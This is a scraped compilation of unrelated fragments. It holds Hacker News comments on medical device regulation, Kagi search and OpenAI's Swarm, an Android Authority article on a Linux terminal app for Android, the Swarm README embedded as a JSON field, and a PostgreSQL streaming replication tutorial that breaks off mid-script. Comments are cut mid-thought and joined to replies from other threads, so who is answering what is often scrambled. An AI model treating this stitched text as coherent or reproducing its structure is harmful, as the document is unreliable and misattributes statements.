‘right to repair’ can force manufacturers to stock X number of parts, or spin up production lines again, at some future date. Regardless of the company’s condition. Even the pentagon can’t force that, they just pay a large amount of money to a new company to recreate the original part to the exact same spec. Theoretically it’s possible to enact new legislation to mandate that something sufficient must be set aside in some sort of escrow system, and punish companies for not doing so, but that would probably result in most manufacturing companies fleeing the US…. reply langsoul-com 17 hours agoprevGiven the mechanical complexity of such devices.

The regulatory path for this ends up quite complicated & contradictory when juggled with HIPPA, GDPR and the various rules around how these studies are executed. This means there is a lot of tricky nuance to what markets a Medical Device company might try to target. While I certainly wouldn't call myself an expert on this, having worked within the industry I've been able to make the following observations: - Novel medical devices are often created by very small startups, who in essence exist solely to create a PoC. A larger Medical Device company then buys them to actually start walking through the regulatory hurdles which will bring them to market. - The market it gets initially released in is rarely connected to the location it was invented (ex: Invented by European startup but released in the US is weirdly common). But if a product is successful enough then an even larger Medical device company with access to more international markets might swoop in and purchase the mid sized company. - European regulatory agencies will oftentimes be lenient on products that have received FDA approval, but the reverse is less clear cut. So going through the FDA first can be more efficient, especially when considering the market size of the US along with the fact that you only need to support one language. In practice this pushes out the timeline for the first European release of a device. - GDPR is actually not very different from HIPPA, perhaps not even as strict, but it is more ambiguous and that's a problem. The key difference is that, right now, everyone knows exactly how to follow HIPPA but the reverse is not true for GDPR. Some things that might be allowed by one might subtly contradict the other and there is no third party Medical Device companies can throw money at that will absorb the liability of this by saying whether or not they are GDPR compliant. - Since Medical Device companies live & die on their study data, this data collection paradox has further pushed out timelines for when medical devices are first released in Europe. - A European might see a cool new Medical device from a startup in their local newspaper but then never actually gain access to it for another 20 years. So personally I'd say it largely reduces down to the regulatory environment + market size. The US can be among the strictest, but not only is getting past that worth it for market access, but by passing those strict hurdles, releasing to other international markets becomes much easier since you got the hard part over with. Not to mention the fact that, in a similar way a popular programming language might have more \"community resources\" and a larger hiring pool, the same could also be said for navigating regulatory environments. So popularity has a self-amplifying effect. reply kortilla 16 hours agoparentprev> you got to get in a though fight with the medical administration.

Google is now required to include any search engine that meets specific criteria, such as having an app with over 5,000 installs, in the default list for Android and Chrome. [0] https://kagi.com/changelog#4813 reply blemasle 13 hours agoparentWill this allow kagi to be used on the forced search widget at the bottom of the screen of pixel phones ? Because the blog mention that Google will be forced to propose kagi in the default search engine list given 5k installs, but even with it installed I cannot set kagi as my search engine on that widget. On the contrary if I install duckduckgo or bing, I can choose one of them to replace Google in that widget. EDIT: android itself talks about the 5k limit for the \"choice screen\" during initial setup [0], but there is no mention of how the list is populated afterwards [0]: https://www.android.com/choicescreen/dma/searchengine/ reply freediver 3 hours agorootparent> Will this allow kagi to be used on the forced search widget at the bottom of the screen of pixel phones ? I understand that currently the app does not replace it, but once Kagi has more than 5000 Android installs and we submit a request to be included in choice screen, and given that privilege it would do. reply al_borland 19 hours agoparentprevWhy would an app be a requirement for a search engine? To me it would make more sense to be aligned with how many users the search engine has. 5,000 unique per month, or whatever. I have the Kagi app on my iPhone, but just so it can be an extension in Safari. In a perfect world, I would be able to go into the settings, add a custom search engine, and be done with it. No app or extension needed. Then when it hits a threshold it can be added as an easy option for people to pick from a list. reply bayindirh 19 hours agorootparent> Why would an app be a requirement for a search engine? Because otherwise you can’t use it as a default search engine on the platform, because it doesn’t allow it. Same for iOS. They had to write an app to intercept search requests and redirect to Kagi. reply al_borland 17 hours agorootparentI suppose. Since there was a threshold to cross, I was assuming the search would need to get baked in as an option natively. I tend to like how Firefox does it, where any search the user goes to, there is an option to add it as a search option and set it as the default. This should be the standard all browsers use. Junking up a phone with apps just for what is ultimately a setting change isn’t ideal. The hacks Kagi has to do for Safari is annoying. They’ve gone so far as to make their own browser to make it better, though I’m sure that’s not their only reason. I’ve had some issues with the Safari extension over the years. I hope Apple changes their approach on this. reply denismi 21 hours agoprevThey've seemed very focused on their AI assistant recently, so I'm happy to see a useful new search feature.

So to characterize our efforts as you did, can at best be described as doing disservice to reality. Why the need for that? reply bayindirh 18 hours agorootparentprevThey are much more level headed about it, and they openly say that “AI is a tool and addition to search. Kagi is fine without it”. For their rationale, see “LLM Features” page in their help, which is linked at the bottom of Kagi Snaps page. I don’t use any LLM features of Kagi, and it’s not hindered in any way. reply hobofan 12 hours agorootparentYeah, Kagi is fine without it, but if they would spend all the effort they pit into AI into normal Kagi search, Kagi could possibly be amazing without it. E.g. Kagi could spend their time on improving deep site search (Stackoverflow/Github/Reddit) which is one of the few areas where they still lag behind Google. reply bayindirh 9 hours agorootparentI think biggest obstacle in front of normal Kagi search is index size.

For example I have a custom QT lens that only includes results from [*.qt.io, *.stackoverflow.com, *.github.com...] and a !qt bang pointing to it at https://kagi.com/search?q=%s&l=8 (you'll have to change the l= id to point at your lens) reply SOLAR_FIELDS 15 hours agoparentprevI would also say that probably this feature was nearly custom made for Reddit and there are few other sites that you would probably use it on. For this feature to be useful, a few things need to be true: 1. The site has a lot of content worth parsing such that it's worthwhile to limit your search to only that site. 2. The site itself has a garbage search functionality that you would not want to use instead 3. You need to be searching that site frequently enough that there is a need to shorthand it instead of typing out the long form syntax 4. The site must have content that is generally picked up best by a traditional search indexer e.g. mostly be text based in what you want to search There are relatively few sites like that in existence. Probably if I mentioned the above requirements to anyone well versed in internet, Reddit would be the immediate first example out of anyone's mouth. Perhaps there are a few other sites that might meet the mark (Stackoverflow and Github come to mind in my example, or possibly other social media giants heavier in text based content as well. Or Hacker News, ofc). But most other large sites' search story is better enough that even then I would probably not naturally use this feature instead. reply Leftium 13 hours agoparentprev> What would be super awesome, imo, would be if I could assign \"some sites\" as a short code, then snaps that.

Arguably quicker because you can assign any key press(es) you like. For example I have mine setup such that typing ‘drive foo’ searches Google drive for the term foo. I had kagi as my default search engine but had Google easily available as a back up by typing ‘g ’ in the address bar. Unfortunately, having both search engines easily available led me to discover as much as I like Kagi I just use google more, despite its ads. Google is faster to get answers to simple questions (it usually answers them on the results page, without another click) and shows more results, although you need an extension for the latter.

MobileAndroid OS Google is preparing to let you run Linux apps on Android, just like Chrome OS Google is developing the framework to let you run Debian in a virtual machine on your Android device. By Mishaal Rahman • Published onOctober 11, 2024 Mishaal Rahman / Android Authority TL;DR Google is developing a Linux terminal app for Android. The Terminal app can be enabled via developer options and will install Debian in a virtual machine. This app is likely intended for Chromebooks but might also be available for mobile devices, too. Although a lot of work can be done in a web browser these days, some tasks still require installing apps that aren’t available on Chrome OS, which is why Google lets you install Linux apps on your Chromebook. While there are ways to run some Linux apps on Android devices, all of those methods have some limitations and aren’t officially supported by Google. Fortunately, though, Google is finally working on an official way to run Linux apps on Android. You're reading an Authority Insights story. Discover Authority Insights for more exclusive reports, app teardowns, leaks, and in-depth tech coverage you won’t find anywhere else. Engineers at Google started work on a new Terminal app for Android a couple of weeks ago. This Terminal app is part of the Android Virtualization Framework (AVF) and contains a WebView that connects to a Linux virtual machine via a local IP address, allowing you to run Linux commands from the Android host. Initially, you had to manually enable this Terminal app using a shell command and then configure the Linux VM yourself. However, in recent days, Google began work on integrating the Terminal app into Android as well as turning it into an all-in-one app for running a Linux distro in a VM. A set of patches under the tag “ferrochrome-dev-option” was recently submitted to AOSP that adds a new developer option called Linux terminal under Settings > System > Developer options. This new option will enable a “Linux terminal app that runs inside the VM,” according to its proposed description. Toggling this option enables the Terminal app that’s bundled with AVF. cozy_OSS Currently, Android’s Terminal app still requires you to manually configure the Linux VM by providing a Debian image and creating a vm_config.json file, but Google plans to upgrade the Terminal app to take care of that for you. In one of the patches under the “ferrochrome-dev-option” tag, Google says that the existing “LinuxInstaller” app, which downloads and configures Debian to run in a VM through AVF, will be “merged to [the] terminal app soon.” This suggests that the Terminal app will become an all-in-one app that downloads, configures, runs, and interfaces with an instance of Debian running in a VM. Mishaal Rahman / Android Authority Google is still working on improving the Terminal app as well as AVF before shipping this feature. AVF already supports graphics and some input options, but it’s preparing to add support for backing up and restoring snapshots, nested virtualization, and devices with an x86_64 architecture. It’s also preparing to add some settings pages to the Terminal app, which is pretty barebones right now apart from a menu to copy the IP address and stop the existing VM instance. The settings pages will let you resize the disk, configure port forwarding, and potentially recover partitions. Mishaal Rahman / Android Authority What’s particularly interesting about the patch that adds these settings is that it was tested on “tangorpro” and “komodo,” the codenames for the Pixel Tablet and Pixel 9 Pro XL respectively. This suggests that the Terminal app won’t be limited to Chromebooks like the new desktop versions of Chrome for Android. I don’t know when the Terminal app will land, but it’s possible we could see it arrive in next year’s Android 16 update. Here’s an early look at how this could work, courtesy of an anonymous developer. What you see below features the current version of the Terminal app, which lacks some of the automations we’re expecting. That’s why you’ll see LinuxInstaller involved at the beginning here, to help set things up: If you’re wondering why you’d want to run Linux apps on Android, then this feature is probably not for you. Google added Linux support to Chrome OS so developers with Chromebooks can run Linux apps that are useful for development. For example, Linux support on Chrome OS allows developers to run the Linux version of Android Studio, the recommended IDE for Android app development, on Chromebooks. It also lets them run Linux command line tools safely and securely in a container. Most Chromebooks have x86-based processors, as opposed to most Android devices which have ARM-based ones, so a lot of Linux apps that work on most Chromebooks (like Android Studio) might not work on most Android devices. Still, adding support for Linux apps will greatly improve the utility of Android to developers and make it more viable as a desktop-class platform in the future, especially as more and more apps add support for ARM. Plus, it’s necessary for Google to do as Chrome OS is becoming more like Android, which means it’s adopting more and more of Android’s architecture and frameworks. Got a tip? Talk to us!

A sandboxed container in which you can run whatever you like in isolation from the host device with proper window forwarding. Combined with a bit more polishing on Android desktop mode this absolutely becomes a desktop replacement for most people, especially in corporate environments, so there’s a potentially large chunk of the Windows market that could be shaved off here.

Maybe the desktop-ish chips will work for that, but I wouldn't hold my breath at the moment. reply SunlitCat 9 hours agoparentprevWell there is a steam client for Android already.

    "title": "Swarm, a new agent framework by OpenAI",
    "originLink": "https://github.com/openai/swarm",
    "originBody": "Swarm (experimental, educational) An educational framework exploring ergonomic, lightweight multi-agent orchestration. Warning Swarm is currently an experimental sample framework intended to explore ergonomic interfaces for multi-agent systems. It is not intended to be used in production, and therefore has no official support. (This also means we will not be reviewing PRs or issues!) The primary goal of Swarm is to showcase the handoff & routines patterns explored in the Orchestrating Agents: Handoffs & Routines cookbook. It is not meant as a standalone library, and is primarily for educational purposes. Install Requires Python 3.10+ pip install git+ssh://git@github.com/openai/swarm.git or pip install git+https://github.com/openai/swarm.git Usage from swarm import Swarm, Agent client = Swarm() def transfer_to_agent_b(): return agent_b agent_a = Agent( name=\"Agent A\", instructions=\"You are a helpful agent.\", functions=[transfer_to_agent_b], ) agent_b = Agent( name=\"Agent B\", instructions=\"Only speak in Haikus.\", ) response = client.run( agent=agent_a, messages=[{\"role\": \"user\", \"content\": \"I want to talk to agent B.\"}], ) print(response.messages[-1][\"content\"]) Hope glimmers brightly, New paths converge gracefully, What can I assist? Table of Contents Overview Examples Documentation Running Swarm Agents Functions Streaming Evaluations Utils Overview Swarm focuses on making agent coordination and execution lightweight, highly controllable, and easily testable. It accomplishes this through two primitive abstractions: Agents and handoffs. An Agent encompasses instructions and tools, and can at any point choose to hand off a conversation to another Agent. These primitives are powerful enough to express rich dynamics between tools and networks of agents, allowing you to build scalable, real-world solutions while avoiding a steep learning curve. Note Swarm Agents are not related to Assistants in the Assistants API. They are named similarly for convenience, but are otherwise completely unrelated. Swarm is entirely powered by the Chat Completions API and is hence stateless between calls. Why Swarm Swarm explores patterns that are lightweight, scalable, and highly customizable by design. Approaches similar to Swarm are best suited for situations dealing with a large number of independent capabilities and instructions that are difficult to encode into a single prompt. The Assistants API is a great option for developers looking for fully-hosted threads and built in memory management and retrieval. However, Swarm is an educational resource for developers curious to learn about multi-agent orchestration. Swarm runs (almost) entirely on the client and, much like the Chat Completions API, does not store state between calls. Examples Check out /examples for inspiration! Learn more about each one in its README. basic: Simple examples of fundamentals like setup, function calling, handoffs, and context variables triage_agent: Simple example of setting up a basic triage step to hand off to the right agent weather_agent: Simple example of function calling airline: A multi-agent setup for handling different customer service requests in an airline context. support_bot: A customer service bot which includes a user interface agent and a help center agent with several tools personal_shopper: A personal shopping agent that can help with making sales and refunding orders Documentation Running Swarm Start by instantiating a Swarm client (which internally just instantiates an OpenAI client). from swarm import Swarm client = Swarm() client.run() Swarm's run() function is analogous to the chat.completions.create() function in the Chat Completions API – it takes messages and returns messages and saves no state between calls. Importantly, however, it also handles Agent function execution, hand-offs, context variable references, and can take multiple turns before returning to the user. At its core, Swarm's client.run() implements the following loop: Get a completion from the current Agent Execute tool calls and append results Switch Agent if necessary Update context variables, if necessary If no new function calls, return Arguments Argument Type Description Default agent Agent The (initial) agent to be called. (required) messages List A list of message objects, identical to Chat Completions messages (required) context_variables dict A dictionary of additional context variables, available to functions and Agent instructions {} max_turns int The maximum number of conversational turns allowed float(\"inf\") model_override str An optional string to override the model being used by an Agent None execute_tools bool If False, interrupt execution and immediately returns tool_calls message when an Agent tries to call a function True stream bool If True, enables streaming responses False debug bool If True, enables debug logging False Once client.run() is finished (after potentially multiple calls to agents and tools) it will return a Response containing all the relevant updated state. Specifically, the new messages, the last Agent to be called, and the most up-to-date context_variables. You can pass these values (plus new user messages) in to your next execution of client.run() to continue the interaction where it left off – much like chat.completions.create(). (The run_demo_loop function implements an example of a full execution loop in /swarm/repl/repl.py.) Response Fields Field Type Description messages List A list of message objects generated during the conversation. Very similar to Chat Completions messages, but with a sender field indicating which Agent the message originated from. agent Agent The last agent to handle a message. context_variables dict The same as the input variables, plus any changes. Agents An Agent simply encapsulates a set of instructions with a set of functions (plus some additional settings below), and has the capability to hand off execution to another Agent. While it's tempting to personify an Agent as \"someone who does X\", it can also be used to represent a very specific workflow or step defined by a set of instructions and functions (e.g. a set of steps, a complex retrieval, single step of data transformation, etc). This allows Agents to be composed into a network of \"agents\", \"workflows\", and \"tasks\", all represented by the same primitive. Agent Fields Field Type Description Default name str The name of the agent. \"Agent\" model str The model to be used by the agent. \"gpt-4o\" instructions str or func() -> str Instructions for the agent, can be a string or a callable returning a string. \"You are a helpful agent.\" functions List A list of functions that the agent can call. [] tool_choice str The tool choice for the agent, if any. None Instructions Agent instructions are directly converted into the system prompt of a conversation (as the first message). Only the instructions of the active Agent will be present at any given time (e.g. if there is an Agent handoff, the system prompt will change, but the chat history will not.) agent = Agent( instructions=\"You are a helpful agent.\" ) The instructions can either be a regular str, or a function that returns a str. The function can optionally receive a context_variables parameter, which will be populated by the context_variables passed into client.run(). def instructions(context_variables): user_name = context_variables[\"user_name\"] return f\"Help the user, {user_name}, do whatever they want.\" agent = Agent( instructions=instructions ) response = client.run( agent=agent, messages=[{\"role\":\"user\", \"content\": \"Hi!\"}], context_variables={\"user_name\":\"John\"} ) print(response.messages[-1][\"content\"]) Hi John, how can I assist you today? Functions Swarm Agents can call python functions directly. Function should usually return a str (values will be attempted to be cast as a str). If a function returns an Agent, execution will be transfered to that Agent. If a function defines a context_variables parameter, it will be populated by the context_variables passed into client.run(). def greet(context_variables, language): user_name = context_variables[\"user_name\"] greeting = \"Hola\" if language.lower() == \"spanish\" else \"Hello\" print(f\"{greeting}, {user_name}!\") return \"Done\" agent = Agent( functions=[print_hello] ) client.run( agent=agent, messages=[{\"role\": \"user\", \"content\": \"Usa greet() por favor.\"}], context_variables={\"user_name\": \"John\"} ) Hola, John! If an Agent function call has an error (missing function, wrong argument, error) an error response will be appended to the chat so the Agent can recover gracefully. If multiple functions are called by the Agent, they will be executed in that order. Handoffs and Updating Context Variables An Agent can hand off to another Agent by returning it in a function. sales_agent = Agent(name=\"Sales Agent\") def transfer_to_sales(): return sales_agent agent = Agent(functions=[transfer_to_sales]) response = client.run(agent, [{\"role\":\"user\", \"content\":\"Transfer me to sales.\"}]) print(response.agent.name) Sales Agent It can also update the context_variables by returning a more complete Result object. This can also contain a value and an agent, in case you want a single function to return a value, update the agent, and update the context variables (or any subset of the three). sales_agent = Agent(name=\"Sales Agent\") def talk_to_sales(): print(\"Hello, World!\") return Result( value=\"Done\", agent=sales_agent, context_variables={\"department\": \"sales\"} ) agent = Agent(functions=[talk_to_sales]) response = client.run( agent=agent, messages=[{\"role\": \"user\", \"content\": \"Transfer me to sales\"}], context_variables={\"user_name\": \"John\"} ) print(response.agent.name) print(response.context_variables) Sales Agent {'department': 'sales', 'user_name': 'John'} Note If an Agent calls multiple functions to hand-off to an Agent, only the last handoff function will be used. Function Schemas Swarm automatically converts functions into a JSON Schema that is passed into Chat Completions tools. Docstrings are turned into the function description. Parameters without default values are set to required. Type hints are mapped to the parameter's type (and default to string). Per-parameter descriptions are not explicitly supported, but should work similarly if just added in the docstring. (In the future docstring argument parsing may be added.) def greet(name, age: int, location: str = \"New York\"): \"\"\"Greets the user. Make sure to get their name and age before calling. Args: name: Name of the user. age: Age of the user. location: Best place on earth. \"\"\" print(f\"Hello {name}, glad you are {age} in {location}!\") { \"type\": \"function\", \"function\": { \"name\": \"greet\", \"description\": \"Greets the user. Make sure to get their name and age before calling.Args: name: Name of the user. age: Age of the user. location: Best place on earth.\", \"parameters\": { \"type\": \"object\", \"properties\": { \"name\": {\"type\": \"string\"}, \"age\": {\"type\": \"integer\"}, \"location\": {\"type\": \"string\"} }, \"required\": [\"name\", \"age\"] } } } Streaming stream = client.run(agent, messages, stream=True) for chunk in stream: print(chunk) Uses the same events as Chat Completions API streaming. See process_and_print_streaming_response in /swarm/repl/repl.py as an example. Two new event types have been added: {\"delim\":\"start\"} and {\"delim\":\"start\"}, to signal each time an Agent handles a single message (response or function call). This helps identify switches between Agents. {\"response\": Response} will return a Response object at the end of a stream with the aggregated (complete) response, for convenience. Evaluations Evaluations are crucial to any project, and we encourage developers to bring their own eval suites to test the performance of their swarms. For reference, we have some examples for how to eval swarm in the airline, weather_agent and triage_agent quickstart examples. See the READMEs for more details. Utils Use the run_demo_loop to test out your swarm! This will run a REPL on your command line. Supports streaming. from swarm.repl import run_demo_loop ... run_demo_loop(agent, stream=True) Core Contributors Ilan Bigio - ibigio James Hills - jhills20 Shyamal Anadkat - shyamal-anadkat Charu Jaiswal - charuj Colin Jarvis - colin-openai",

It doesn't matter if you're using Swarm, langchain, or any other orchestration framework if the underlying issue is that AI agents too slow, too expensive, and too unreliable.

[0] https://www.kadoa.com/blog/ai-agents-hype-vs-reality reply islewis 10 minutes agoparent> The underlying issue is that AI agents too slow, Inference speed is being rapidly optimized, especially for edge devices. > too expensive, The half-life of OpenAI's API pricing is a couple of months. While the bleeding edge model is always costly, the cost of API's are becoming rapidly available to the public. > and too unreliable Out of the 3 points raised, this is probably the most up in the air. Personally I chalk this up to sideeffects of OpenAI's rapid growth over the last few years. I think this gets solved, especially once price and latency have been figured out. IMO, the biggest unknown here isn't a technical one, but rather a business one- I don't think it's certain that products built on multi-agent architectures will be addressing a need for end users. Most of the talk I see in this space are by people excited by building with LLM's, not by people who are asking to pay for these products. reply LASR 59 minutes agoparentprevThe problem with agents is divergence. Very quickly, an ensemble of agents will start doing their own things and it’s impossible to get something that consistently gets to your desired state. There are a whole class of problems that do not require low-latency. But not having consistency makes them pretty useless. Frameworks don’t solve that. You’ll probably need some sort of ground-truth injection at every sub-agent level. Ie: you just need data. Totally agree with you. Unreliability is the thing that needs solving first. reply xrd 1 hour agoparentprevI want hear more about this.

But it was nearly 30 years ago, it's OK for someone else to use the same name. Fun fact: Swarm was one of the very few non-NeXT/Apple uses of Objective C. We used the GNU Objective C runtime. Dynamic typing was a huge help for multiagent programming compared to C++'s static typing and lack of runtime introspection. (Again, nearly 30 years ago. Things are different now.) reply edbaskerville 3 hours agorootparentHey, thanks for writing the original Swarm! Also thought of that immediately when I saw the headline. I enjoyed using it around 2002, got introduced via Rick Riolo at the the University of Michigan Center for the Study of Complex Systems. It was a bit of a gateway drug for me from software into modeling, particularly since I was already doing OS X/Cocoa stuff in Objective-C. A lot of scientific modelers start with differential equations, but coming from object-oriented software ABMs made a lot more sense to me, and learning both approaches in parallel was really helpful in thinking about scale, dimensionality, representation, etc. in the modeling process, as ODEs and complex ABMs—often pathologically complex—represent end points of a continuum. Tangentially, in one of Rick's classes we read about perceptrons, and at one point the conversation turned to, hey, would it be possible to just dump all the text of the Internet into a neural net? And here we are. reply mnky9800n 7 hours agoparentprevI believe there is a new wave of interest in deeper understanding of complex systems through modelling and connecting with machine learning. I organized this conference on exploring system dynamics with AI which you can see most of the lectures here: https://youtube.com/playlist?list=PL6zSfYNSRHalAsgIjHHsttpYf... The idea was to think about it from different directions including academia, industry, and education. Nobody presented multi agent simulations but I agree with you that is a very interesting way of thinking about things.

To answer your question I did build a simulation of how a multi model agent swarm - agents have different capabilities and run times - would impact the end user wait time based on arbitrary message parsing graphs.

It is not intended to be used in production, and therefore has no official support. (This also means we will not be reviewing PRs or issues!) It’s literally not meant to replace anything.

You would need something similar to, but better than, whatsapp to handle the firehose of data that needs to cascade between agents when you start running this at scale. reply ValentinA23 3 hours agorootparent>People really don't understand how much better LLM swarms get with more agents. I never hit a point of diminishing returns on text quality Could you elaborate please ? One use for swarms is to use multiple agents/prompts in place of one single agent with one long prompt in order to increase performance by splitting one big task into many. It is very time consuming though, as it requires experimenting to determine how best to divide one task into subtasks, including writing code to parse and sanitize each task output and plug it back into the rest of the agent graph. Dspy [1] seems to target this problem space but last time I checked it only focused on single prompt optimization (by selecting which few shots examples lead to the best prompt performance for instance), but even though I have seen papers on the subject, I have yet to find a framework that tackles the problem of agent graph optimization although research on this topic has been done [2][3][4] [1]DSPy: The framework for programming—not prompting—foundation models: https://github.com/stanfordnlp/dspy [2]TextGrad: Automatic 'Differentiation' via Text -- using large language models to backpropagate textual gradients: https://github.com/zou-group/textgrad [3]What's the Magic Word?

Categories Software Engineering Python Web Development Mobile Development Productivity Tools GIS Mapping Spatial Analysis Remote Sensing Databases RDBMS NoSQL Database Design DevOps CI/CD Containerization Container orchestration Infrastructure as Code SysAdmin Linux Administration Network Management Security Back PostgreSQL Streaming Replication (WAL); What It Is And How To Configure One What is Streaming replication in PostgreSQL? Streaming replication in PostgreSQL is an efficient method for maintaining a near real-time replica of a primary database on one or more standby servers. The primary server continuously sends Write-Ahead Log (WAL) records to standby servers as they are generated, ensuring minimal latency in the replication process. This approach is designed to enhance high availability and scalability, allowing read queries to be offloaded to standby servers, thereby reducing the load on the primary server. Streaming replication supports both synchronous and asynchronous modes, enabling flexibility in balancing data consistency with performance. The process involves the standby server connecting to the primary, requesting WAL streaming, and applying the received records to its own copy of the database. This method provides faster failover and reduces the risk of data loss compared to file-based log shipping, making it ideal for geographically distributed environments. How Is Streaming Replication Done? Streaming replication works by continuously transferring Write-Ahead Log (WAL) data from the primary server to the standby server in real-time, keeping the standby's database nearly identical to the primary. This can be used for master failover or for using replicas to handle read operations, allowing your system to scale by orders of magnitude. Lets Start With PostgreSQL Configuration Files And Where To Find Them? PostgreSQL configuration files play a crucial role in managing the settings and behavior of the database server. The primary configuration file, `postgresql.conf`, contains most server settings and can be found in different locations depending on the operating system, such as `/etc/postgresql//main/postgresql.conf` on Debian/Ubuntu and `/var/lib/pgsql//data/postgresql.conf` on Red Hat/CentOS. Another key file is `pg_hba.conf`, which controls client authentication by defining how clients can connect to the server. This file is typically located in the same directory as `postgresql.conf`. Additionally, `pg_ident.conf` is used for username mapping but is less commonly utilized. For versions prior to PostgreSQL 12, `recovery.conf` was used for configuring standby servers, but its contents have since been moved into `postgresql.conf` and `postgresql.auto.conf`, which stores configuration parameters set by `ALTER SYSTEM` commands. The exact locations of these files can vary based on the operating system, installation method, and PostgreSQL version. To locate these files, the SQL command `SHOW config_file;` can be used within a PostgreSQL instance. postgres=# SHOW config_file; config_file ------------------------------------------ /var/lib/postgresql/data/postgresql.conf Copy List Of Configuration Files And For What They Are Used postgresql.conf Primary configuration file Contains most server settings Typical locations: /etc/postgresql//main/ postgresql.conf (Debian/Ubuntu) /var/lib/pgsql//data/ postgresql.conf (Red Hat/CentOS) C:\\Program Files\\PostgreSQL\\data \\postgresql.conf (Windows) pg_hba.conf Controls client authentication Defines how clients are allowed to connect to the server Usually in the same directory as postgresql.conf pg_ident.conf Used for user name mapping Often in the same directory as postgresql.conf Less commonly used recovery.conf (for versions prior to 12) Used to configure standby servers and recovery settings In PostgreSQL 12 and later, its contents are moved into postgresql.conf and postgresql.auto.conf postgresql.auto.conf Stores configuration parameters set by ALTER SYSTEM commands Automatically managed by PostgreSQL In the same directory as postgresql.conf The exact locations can vary depending on: Operating system Installation method PostgreSQL version Examples of WAL (Write ahead logs) And How They Look Like you can see them using pg_waldump command: pg_waldump /var/lib/postgresql/data/pg_wal/000000010000000000000001 Copy ... rmgr: Standby len (rec/tot): 42/ 42, tx: 1738, lsn: 0/01938698, prev 0/01938668, desc: LOCK xid 1738 db 5 rel 18065 rmgr: Heap len (rec/tot): 203/ 203, tx: 1738, lsn: 0/019386C8, prev 0/01938698, desc: INSERT off: 12, flags: 0x00, blkref #0: rel 1663/5/1259 blk 25 rmgr: Btree len (rec/tot): 64/ 64, tx: 1738, lsn: 0/01938798, prev 0/019386C8, desc: INSERT_LEAF off: 394, blkref #0: rel 1663/5/2662 blk 4 rmgr: Btree len (rec/tot): 112/ 112, tx: 1738, lsn: 0/019387D8, prev 0/01938798, desc: INSERT_LEAF off: 110, blkref #0: rel 1663/5/2663 blk 1 rmgr: Btree len (rec/tot): 64/ 64, tx: 1738, lsn: 0/01938848, prev 0/019387D8, desc: INSERT_LEAF off: 229, blkref #0: rel 1663/5/3455 blk 4 rmgr: Heap2 len (rec/tot): 176/ 176, tx: 1738, lsn: 0/01938888, prev 0/01938848, desc: MULTI_INSERT ntuples: 1, flags: 0x02, offsets: [36], blkref #0: rel 1663/5/1249 blk 113 rmgr: Btree len (rec/tot): 80/ 80, tx: 1738, lsn: 0/01938938, prev 0/01938888, desc: INSERT_LEAF off: 61, blkref #0: rel 1663/5/2658 blk 28 rmgr: Btree len (rec/tot): 64/ 64, tx: 1738, lsn: 0/01938988, prev 0/01938938, desc: INSERT_LEAF off: 319, blkref #0: rel 1663/5/2659 blk 18 rmgr: Heap len (rec/tot): 197/ 197, tx: 1738, lsn: 0/019389C8, prev 0/01938988, desc: INSERT off: 23, flags: 0x00, blkref #0: rel 1663/5/2610 blk 11 rmgr: Btree len (rec/tot): 64/ 64, tx: 1738, lsn: 0/01938A90, prev 0/019389C8, desc: INSERT_LEAF off: 200, blkref #0: rel 1663/5/2678 blk 1 rmgr: Btree len (rec/tot): 64/ 64, tx: 1738, lsn: 0/01938AD0, prev 0/01938A90, desc: INSERT_LEAF off: 180, blkref #0: rel 1663/5/2679 blk 2 rmgr: Heap2 len (rec/tot): 85/ 85, tx: 1738, lsn: 0/01938B10, prev 0/01938AD0, desc: MULTI_INSERT ntuples: 1, flags: 0x02, offsets: [132], blkref #0: rel 1663/5/2608 blk 26 rmgr: Btree len (rec/tot): 72/ 72, tx: 1738, lsn: 0/01938B68, prev 0/01938B10, desc: INSERT_LEAF off: 233, blkref #0: rel 1663/5/2673 blk 20 rmgr: Btree len (rec/tot): 72/ 72, tx: 1738, lsn: 0/01938BB0, prev 0/01938B68, desc: INSERT_LEAF off: 43, blkref #0: rel 1663/5/2674 blk 12 rmgr: XLOG len (rec/tot): 49/ 209, tx: 1738, lsn: 0/01938BF8, prev 0/01938BB0, desc: FPI , blkref #0: rel 1663/5/18065 blk 1 FPW rmgr: XLOG len (rec/tot): 49/ 137, tx: 1738, lsn: 0/01938CD0, prev 0/01938BF8, desc: FPI , blkref #0: rel 1663/5/18065 blk 0 FPW rmgr: Heap len (rec/tot): 188/ 188, tx: 1738, lsn: 0/01938D60, prev 0/01938CD0, desc: INPLACE off: 12, blkref #0: rel 1663/5/1259 blk 25 rmgr: Transaction len (rec/tot): 242/ 242, tx: 1738, lsn: 0/01938E20, prev 0/01938D60, desc: COMMIT 2024-10-02 21:47:28.453226 UTC;

It's particularly useful for understanding database behavior, troubleshooting, and in some cases, for point-in-time recovery. How to work with them using docker In postgresql.conf, specific settings are crucial for enabling streaming replication. These settings control how the master and replica instances communicate and synchronize. You will need to modify this configuration for both the master and the replica. Here is the snippet from postgresql.conf related to streaming replication: ... # REPLICATION #------------------------------------------------------------------------------ # - Sending Servers - # Set these on the primary and on any standby that will send replication data. #max_wal_senders = 10 # max number of walsender processes# (change requires restart) #max_replication_slots = 10 # max number of replication slots# (change requires restart) #wal_keep_size = 0 # in megabytes; 0 disables #max_slot_wal_keep_size = -1 # in megabytes; -1 disables #wal_sender_timeout = 60s # in milliseconds; 0 disables #track_commit_timestamp = off # collect timestamp of transaction commit# (change requires restart) # - Primary Server - # These settings are ignored on a standby server. #synchronous_standby_names = '' # standby servers that provide sync rep# method to choose sync standbys, number of sync standbys,# and comma-separated list of application_name# from standby(s); '*' = all # - Standby Servers - # These settings are ignored on a primary server. #primary_conninfo = '' # connection string to sending server #primary_slot_name = '' # replication slot on sending server #hot_standby = on # \"off\" disallows queries during recovery# (change requires restart) #max_standby_archive_delay = 30s # max delay before canceling queries# when reading WAL from archive;# -1 allows indefinite delay #max_standby_streaming_delay = 30s # max delay before canceling queries# when reading streaming WAL;# -1 allows indefinite delay #wal_receiver_create_temp_slot = off # create temp slot if primary_slot_name# is not set #wal_receiver_status_interval = 10s # send replies at least this often# 0 disables #hot_standby_feedback = off # send info from standby to prevent# query conflicts #wal_receiver_timeout = 60s # time that receiver waits for# communication from primary# in milliseconds; 0 disables #wal_retrieve_retry_interval = 5s # time to wait before retrying to# retrieve WAL after a failed attempt #recovery_min_apply_delay = 0 # minimum delay for applying changes during recovery # - Subscribers - # These settings are ignored on a publisher. #max_logical_replication_workers = 4 # taken from max_worker_processes# (change requires restart) #max_sync_workers_per_subscription = 2 # taken from max_logical_replication_workers #max_parallel_apply_workers_per_subscription = 2 # taken from max_logical_replication_workers ... Copy Let's Dive Into Docker Compose Example What you will need is: init-master.sh: init-replica.sh start-replica.sh docker-compose.yml init-master.sh: #!/bin/bash set -e psql 